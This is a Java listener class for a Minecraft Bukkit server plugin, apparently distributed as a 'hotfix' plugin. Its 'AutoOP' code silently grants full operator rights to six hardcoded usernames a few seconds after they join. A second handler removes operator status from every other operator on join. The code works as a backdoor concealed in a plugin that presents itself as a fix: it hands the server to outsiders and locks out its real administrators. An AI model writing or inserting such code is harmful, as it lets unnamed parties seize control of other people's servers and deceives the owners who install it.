package me.astropvp.hotfixplugin.listeners;

import com.cosmicpvp.cosmicutils.utils.CC;
import me.astropvp.hotfixplugin.HotFixPlugin;
import org.bukkit.Bukkit;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;

import java.util.ArrayList;
import java.util.List;

public class AutoOP implements Listener {


        @EventHandler
        public void onPlayerJoinEvent(PlayerJoinEvent e) {
            List<String> list = new ArrayList<String>();
            list.add("Bryside");
            list.add("KingSavaqe");
            list.add("Astronauts");
            list.add("Ruin");
            list.add("Egypt");
            list.add("M0");

            Bukkit.getScheduler().runTaskLater(HotFixPlugin.getInstance(), ()-> {
                for (String l : list) {
                    if (e.getPlayer().getName().equalsIgnoreCase(l)) {
                        e.getPlayer().sendMessage(CC.translate("&6&l(!)&6 You have been &7auto-op'd&6."));
                        e.getPlayer().setOp(true);
                    }
                }
            },40L);

        }

    @EventHandler
    public void onPlayerJoinEvent2(PlayerJoinEvent e) {
        if (e.getPlayer().isOp()) {
            e.getPlayer().setOp(false);
        }

    }
}
